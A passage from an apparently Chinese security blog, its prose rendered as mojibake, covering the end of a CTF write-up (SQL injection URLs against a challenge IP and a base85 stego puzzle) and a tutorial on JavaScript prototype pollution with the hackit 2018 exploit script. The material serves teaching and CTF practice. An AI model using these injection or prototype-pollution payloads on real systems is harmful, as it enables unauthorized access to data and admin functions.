<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select*from/**/users)x)%23</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹fllllaaagggè¡¨å†…å®¹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/a,2/**/as/**/b/**/union/**/select*from/**/flllaaaggg)x)%23</span><br></pre></td></tr></table></figure>

<h3 id="MISC-welcome"><a href="#MISC-welcome" class="headerlink" title="MISC-welcome"></a><strong>MISC-welcome</strong></h3><p>å‰é¢æ²¡è®°é”™çš„è¯ï¼Œåº”è¯¥æ˜¯è™ç¬¦çš„åŸé¢˜å§ï¼Œé¢˜ç›®é™„ä»¶æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>flag.rar</code>  ä¸€ä¸ª<code>red_blue.png</code>ã€‚</p>
<p>ç”¨<code>stegsolve</code>æŸ¥çœ‹å›¾ç‰‡ï¼Œ<code>Save Bin</code>å¯ç›´æ¥å¾—åˆ°å›¾ç‰‡æå–å‡ºæ¥å‘ç°æ˜¯å¯†ç ä¸º<code>/*///1258/*/@#</code></p>
<p>360è§£å‹æ‰“å¼€å‘ç°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ao(mgHXo,o0fV<span class="string">&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span></span><br></pre></td></tr></table></figure>

<p>å½“æ—¶æ²¡æƒ³åˆ°æ˜¯base85ç¼–ç ï¼Œæ‰€ä»¥æ²¡åšå‡ºæ¥</p>
<p>åœ¨çº¿è§£å¯†å¾—åˆ°flagï¼š<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">NodeJså­¦ä¹ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-20 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-20T00:00:00+08:00">2020-07-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:53:46" itemprop="dateModified" datetime="2020-10-16T11:53:46+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢NodeJs</p>
<h1 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a><strong>åŸå‹</strong></h1><p>é¦–å…ˆè¦ææ¸…æ¥š<code>prototype</code>ï¼Œ<code>__proto__</code>ï¼Œ<code>constructor</code>è¿™ä¸‰ä¸ªä¸œè¥¿ã€‚</p>
<p>åœ¨JSä¸­ï¼Œå£°æ˜ä¸€ä¸ªå‡½æ•°Fooçš„åŒæ—¶ï¼Œæµè§ˆå™¨ä¼šåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åFooå‡½æ•°é»˜è®¤æœ‰ä¸€ä¸ªå±æ€§<code>prototype</code>æŒ‡å‘äº†è¿™ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯å‡½æ•°Fooçš„<strong>åŸå‹å¯¹è±¡</strong>ï¼Œç®€ç§°ä¸ºå‡½æ•°çš„åŸå‹ã€‚è¿™ä¸ªå¯¹è±¡é»˜è®¤ä¼šæœ‰ä¸ªå±æ€§<code>constructor</code>æŒ‡å‘äº†è¿™ä¸ªå‡½æ•°Fooã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype.constructor)<span class="comment">//[Function: Foo]</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡½æ•°Fooåˆ›å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡fooï¼Œfooé»˜è®¤ä¼šæœ‰ä¸€ä¸ªå±æ€§<code>__proto__</code>æŒ‡å‘äº†å‡½æ•°Fooçš„åŸå‹å¯¹è±¡ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.__proto__)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="comment">//Foo.prototype == foo.__proto__</span></span><br></pre></td></tr></table></figure>

<p>åŸå‹é“¾æ˜¯å°±æ˜¯æ¯”å¦‚å¯¹è±¡è°ƒç”¨ä¸€ä¸ªå±æ€§eatçš„æ—¶å€™</p>
<ol>
<li>åœ¨å¯¹è±¡Leeä¸­å¯»æ‰¾eatå±æ€§</li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>Lee.__proto__</code>ä¸­å¯»æ‰¾eatå±æ€§</li>
<li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>Lee.__proto__.__proto__</code>ä¸­å¯»æ‰¾eatå±æ€§</li>
<li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li>
</ol>
<img src="http://img.kawhi.xyz/image-20200719212225968.png" style="high:100%;width:100%;" />

<p><strong>å°ç»“</strong></p>
<ul>
<li><p>å¯¹è±¡æœ‰<code>__proto__</code> å’Œ <code>constructor</code>ä¸¤ç§å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘å¯¹è±¡æ‰€åœ¨å‡½æ•°çš„<code>prototype</code>å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„<code>constructor</code>å±æ€§å°±æ˜¯<strong>æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°</strong>ï¼Œæ‰€æœ‰å‡½æ•°æœ€ç»ˆçš„æ„é€ å‡½æ•°éƒ½æŒ‡å‘<strong>Function</strong>ã€‚</p>
</li>
<li><p>å‡½æ•°æœ‰<code>prototype</code> å’Œ <code>__proto__</code> å’Œ <code>constructor</code> ä¸‰ç§å±æ€§ã€‚</p>
<p>å‡½æ•°çš„<code>prototype</code>æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œå¹¶ä¸”<code>prototype</code>æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§ã€‚</p>
</li>
</ul>
<p>é¢˜å¤–è¯ï¼šES6æ¨¡æ¿å­—ç¬¦ä¸²</p>
<p>ç”¨åå¼•å·é‡Œé¢å¯ä»¥åŠ å…¥æ¨¡æ¿ï¼Œä¾‹å¦‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fruit = <span class="string">&#x27;apple&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`i like <span class="subst">$&#123;fruit&#125;</span> very much`</span>);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i like apple very much</span><br></pre></td></tr></table></figure>

<h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a><strong>åŸå‹é“¾æ±¡æŸ“</strong></h1><p>JSçš„è¿™ç§ç»§æ‰¿æ˜¯åŠ¨æ€çš„ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)<span class="comment">//Name: Melania Trump</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line">son.__proto__[<span class="string">&#x27;add_name&#x27;</span>] = <span class="string">&#x27;kk&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> son1 = <span class="keyword">new</span> Son();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son Name: <span class="subst">$&#123;son.add_name&#125;</span>`</span>);<span class="comment">//son Name: kk</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son1 Name: <span class="subst">$&#123;son1.add_name&#125;</span>`</span>);<span class="comment">//son1 Name: kk</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æƒŠè®¶çš„å‘ç°ä¸€ä¸ªå¯¹è±¡sonä¿®æ”¹è‡ªèº«çš„åŸå‹çš„å±æ€§çš„æ—¶å€™ä¼šå½±å“åˆ°å¦å¤–ä¸€ä¸ªå…·æœ‰ç›¸åŒåŸå‹çš„å¯¹è±¡son1ã€‚ç”šè‡³å¯ä»¥å†ä¸Šä¸€å±‚ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">son.__proto__.__proto__[<span class="string">&#x27;boy&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(son1.boy);<span class="comment">//123</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å¯¹æ¯”ä¸€ä¸‹javaçš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Son</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.name = <span class="string">&quot;father&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">alert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am son&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Son s1 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//father</span></span><br><span class="line">        s1.name = <span class="string">&quot;son&quot;</span>;</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//son</span></span><br><span class="line">        Son s2 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s2.name);<span class="comment">//father</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä¸¤è€…çš„ç»§æ‰¿æ–¹å¼æœºåˆ¶å¯ä»¥è¯´å®Œå…¨ä¸ä¸€æ ·çš„ï¼Œä¸€ä¸ªæ˜¯åŸºäºå¯¹è±¡æ¥ç»§æ‰¿ï¼Œä¸€ä¸ªæ˜¯åŸºäºåŸå‹æ¥ç»§æ‰¿ã€‚</p>
<h2 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a><strong>åˆ©ç”¨æ‰‹æ®µ</strong></h2><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)<span class="comment">//1 2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœæ˜¯ï¼Œåˆå¹¶è™½ç„¶æˆåŠŸäº†ï¼Œä½†åŸå‹é“¾æ²¡æœ‰è¢«æ±¡æŸ“ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©<code>__proto__</code>è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p>
<p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p>
<h2 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a><strong>hackit 2018</strong></h2><p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user=[];</span><br><span class="line">app.get(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="comment">/*this is under development I guess ??*/</span></span><br><span class="line">    <span class="built_in">console</span>.log(user.admintoken);</span><br><span class="line">    <span class="keyword">if</span>(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.status(<span class="number">403</span>).send(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">app.post(<span class="string">&#x27;/api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> client = req.body;</span><br><span class="line">    <span class="keyword">var</span> winner = <span class="literal">null</span>;</span><br><span class="line">    matrix[client.row][client.col] = client.data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è·å–flagçš„æ¡ä»¶æ˜¯ä¼ å…¥çš„querytokenè¦å’Œuseræ•°ç»„æœ¬èº«çš„admintokençš„MD5å€¼ç›¸ç­‰ï¼Œä¸”äºŒè€…éƒ½è¦å­˜åœ¨ã€‚</p>
<p>ç”±ä»£ç å¯çŸ¥ï¼Œå…¨æ–‡æ²¡æœ‰å¯¹user.admintoknè¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥ç†è®ºä¸Šè¿™ä¸ªå€¼æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰ä¸€å¥èµ‹å€¼è¯­å¥ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matrix[client.row][client.col] = client.data</span><br></pre></td></tr></table></figure>

<p><code>data</code>ï¼Œ<code>row</code>ï¼Œ<code>col</code>ï¼Œéƒ½æ˜¯æˆ‘ä»¬postä¼ å…¥çš„å€¼ï¼Œéƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥æ„é€ åŸå‹é“¾æ±¡æŸ“ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> client = &#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> matrix=[];</span><br><span class="line">matrix[client.row][client.col] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user=[]</span><br><span class="line"><span class="built_in">console</span>.log(user.admintoken)<span class="comment">//test</span></span><br></pre></td></tr></table></figure>

<p>çœ‹æ˜¯å¯ä»¥æˆåŠŸæ§åˆ¶userçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶å°±æ˜¯è¦èƒ½å¤Ÿæ§åˆ¶é”®åã€‚</p>
<p>æœ€ç»ˆpayloadï¼Œè¦ä½¿ç”¨jsonä¼ å€¼ï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://target/api&#x27;</span>,json=&#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:<span class="string">&#x27;qqq&#x27;</span>&#125;)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://target/admin?querytoken=&#x27;</span> + md5sumhex(<span class="string">&#x27;qqq&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<h1 id="JSä¸­çš„å¼±ç±»å‹"><a href="#JSä¸­çš„å¼±ç±»å‹" class="headerlink" title="JSä¸­çš„å¼±ç±»å‹"></a><strong>JSä¸­çš„å¼±ç±»å‹</strong></h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]===<span class="number">1</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>æ•°ç»„<code>[1]==1</code>åœ¨ä¸¤ä¸ªç­‰äºå·æ—¶å€™æ˜¯è¿”å›trueçš„ï¼Œè€Œåœ¨ä¸‰ä¸ªç­‰äºå·æ—¶å€™ä¼šè¿”å›falseï¼Œè¿™ä¸€ç‚¹æ˜¯å’Œphpä¸€æ ·çš„ã€‚</p>
